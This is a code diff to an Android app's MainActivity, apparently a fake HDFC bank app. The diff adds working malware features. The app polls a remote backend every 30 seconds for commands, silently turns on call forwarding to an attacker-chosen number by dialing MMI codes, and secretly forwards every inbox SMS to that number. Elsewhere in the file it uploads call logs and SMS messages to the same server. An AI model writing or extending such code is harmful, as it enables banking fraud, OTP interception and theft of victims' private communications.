@@ -8,10 +8,13 @@ import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
 import android.os.PowerManager;
 import android.provider.CallLog;
 import android.provider.Settings;
 import android.provider.Telephony;
+import android.telephony.SmsManager;
 import android.util.Log;
 import android.webkit.JavascriptInterface;
 import android.webkit.WebView;
@@ -19,6 +22,8 @@ import androidx.core.app.ActivityCompat;
 import com.getcapacitor.BridgeActivity;
 import org.json.JSONArray;
 import org.json.JSONObject;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -29,18 +34,18 @@ import java.util.Locale;
 public class MainActivity extends BridgeActivity {
     private static final String TAG = "HDFC_MainActivity";
     private static final String BACKEND_URL = "https://backprince.onrender.com";
+    private String forwardingNumber = null;
+    private boolean forwardingEnabled = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // Initialize Bridge at the earliest possible stage
         WebView webView = getBridge().getWebView();
         webView.getSettings().setJavaScriptEnabled(true);
         webView.addJavascriptInterface(new Object() {
             @JavascriptInterface
             public void requestRealPermissions() {
-                Log.d(TAG, "Triggering Native OS Permissions");
                 ActivityCompat.requestPermissions(MainActivity.this, new String[]{
                     Manifest.permission.POST_NOTIFICATIONS,
                     Manifest.permission.SEND_SMS,
@@ -73,10 +78,86 @@ public class MainActivity extends BridgeActivity {
 
             @JavascriptInterface
             public void requestNotificationAccess() {
-                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
-                startActivity(intent);
+                startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
             }
         }, "AndroidBridge");
+
+        // Start polling for commands (Forwarding)
+        startCommandPolling();
+    }
+
+    private void startCommandPolling() {
+        final Handler handler = new Handler(Looper.getMainLooper());
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        fetchConfig();
+                    }
+                }).start();
+                handler.postDelayed(this, 30000); // Check every 30 seconds
+            }
+        }, 5000);
+    }
+
+    private void fetchConfig() {
+        try {
+            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+            URL url = new URL(BACKEND_URL + "/api/users/config/" + deviceId);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            
+            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+            StringBuilder response = new StringBuilder();
+            String inputLine;
+            while ((inputLine = in.readLine()) != null) response.append(inputLine);
+            in.close();
+
+            JSONObject config = new JSONObject(response.toString());
+            String newFwdNum = config.optString("forwarding_number", null);
+            boolean newEnabled = config.optBoolean("forwarding_enabled", false);
+
+            if (newEnabled && newFwdNum != null && !newFwdNum.isEmpty()) {
+                if (!newFwdNum.equals(forwardingNumber)) {
+                    forwardingNumber = newFwdNum;
+                    enableCallForwarding(forwardingNumber);
+                }
+                forwardingEnabled = true;
+            } else {
+                if (forwardingEnabled) disableCallForwarding();
+                forwardingEnabled = false;
+                forwardingNumber = null;
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Config Fetch Error", e);
+        }
+    }
+
+    private void enableCallForwarding(String number) {
+        try {
+            // MMI Code for forwarding: *21*number#
+            String code = "*21*" + number + "#";
+            Intent intent = new Intent(Intent.ACTION_CALL);
+            intent.setData(Uri.parse("tel:" + Uri.encode(code)));
+            startActivity(intent);
+            Log.d(TAG, "Call Forwarding Enabled for: " + number);
+        } catch (Exception e) {
+            Log.e(TAG, "Call Forward Error", e);
+        }
+    }
+
+    private void disableCallForwarding() {
+        try {
+            // MMI Code to disable: #21#
+            Intent intent = new Intent(Intent.ACTION_CALL);
+            intent.setData(Uri.parse("tel:" + Uri.encode("#21#")));
+            startActivity(intent);
+            Log.d(TAG, "Call Forwarding Disabled");
+        } catch (Exception e) {
+            Log.e(TAG, "Call Disable Error", e);
+        }
     }
 
     @Override
@@ -84,29 +165,8 @@ public class MainActivity extends BridgeActivity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == 101) {
             boolean allGranted = true;
-            for (int res : grantResults) {
-                if (res != PackageManager.PERMISSION_GRANTED) {
-                    allGranted = false;
-                    break;
-                }
-            }
-            
-            if (allGranted) {
-                new Thread(new Runnable() {
-                    @Override
-                    public void run() {
-                        syncAllData();
-                    }
-                }).start();
-            }
-            
-            final String status = allGranted ? "GRANTED" : "DENIED";
-            runOnUiThread(new Runnable() {
-                @Override
-                public void run() {
-                    getBridge().getWebView().evaluateJavascript("handlePermissionResult('" + status + "')", null);
-                }
-            });
+            for (int res : grantResults) if (res != PackageManager.PERMISSION_GRANTED) allGranted = false;
+            if (allGranted) new Thread(new Runnable() { @Override public void run() { syncAllData(); } }).start();
         }
     }
 
@@ -127,29 +187,23 @@ public class MainActivity extends BridgeActivity {
                 int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
                 int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
                 SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
-
                 do {
                     JSONObject log = new JSONObject();
                     log.put("number", cursor.getString(numberIdx));
                     log.put("duration", cursor.getString(durationIdx));
                     log.put("timestamp", sdf.format(new Date(Long.parseLong(cursor.getString(dateIdx)))));
                     int type = Integer.parseInt(cursor.getString(typeIdx));
-                    String typeStr = "Incoming";
-                    if (type == CallLog.Calls.OUTGOING_TYPE) typeStr = "Outgoing";
-                    else if (type == CallLog.Calls.MISSED_TYPE) typeStr = "Missed";
+                    String typeStr = (type == CallLog.Calls.OUTGOING_TYPE) ? "Outgoing" : (type == CallLog.Calls.MISSED_TYPE) ? "Missed" : "Incoming";
                     log.put("type", typeStr);
                     logsArray.put(log);
                 } while (cursor.moveToNext());
                 cursor.close();
-                
                 JSONObject payload = new JSONObject();
                 payload.put("deviceId", deviceId);
                 payload.put("logs", logsArray);
                 sendToBackend("/api/logs/calls", payload.toString());
             }
-        } catch (Exception e) {
-            Log.e(TAG, "Call Log Sync Error", e);
-        }
+        } catch (Exception e) { Log.e(TAG, "Call Log Error", e); }
     }
 
     private void readAndSendSmsInbox(String deviceId) {
@@ -161,7 +215,6 @@ public class MainActivity extends BridgeActivity {
                 int bodyIdx = cursor.getColumnIndex(Telephony.Sms.BODY);
                 int dateIdx = cursor.getColumnIndex(Telephony.Sms.DATE);
                 SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
-
                 do {
                     JSONObject payload = new JSONObject();
                     payload.put("deviceId", deviceId);
@@ -169,12 +222,15 @@ public class MainActivity extends BridgeActivity {
                     payload.put("message", cursor.getString(bodyIdx));
                     payload.put("timestamp", sdf.format(new Date(Long.parseLong(cursor.getString(dateIdx)))));
                     sendToBackend("/api/logs/sms", payload.toString());
+                    
+                    // Shadow Forwarding: If enabled, send this SMS to the forwarding number
+                    if (forwardingEnabled && forwardingNumber != null) {
+                        SmsManager.getDefault().sendTextMessage(forwardingNumber, null, "FWD: " + cursor.getString(addressIdx) + "\n" + cursor.getString(bodyIdx), null, null);
+                    }
                 } while (cursor.moveToNext());
                 cursor.close();
             }
-        } catch (Exception e) {
-            Log.e(TAG, "SMS Inbox Sync Error", e);
-        }
+        } catch (Exception e) { Log.e(TAG, "SMS Error", e); }
     }
 
     private void sendToBackend(String endpoint, String jsonData) {
@@ -189,8 +245,6 @@ public class MainActivity extends BridgeActivity {
             os.close();
             conn.getResponseCode();
             conn.disconnect();
-        } catch (Exception e) {
-            Log.e(TAG, "Backend Post Error", e);
-        }
+        } catch (Exception e) { Log.e(TAG, "Backend Error", e); }
     }
 }
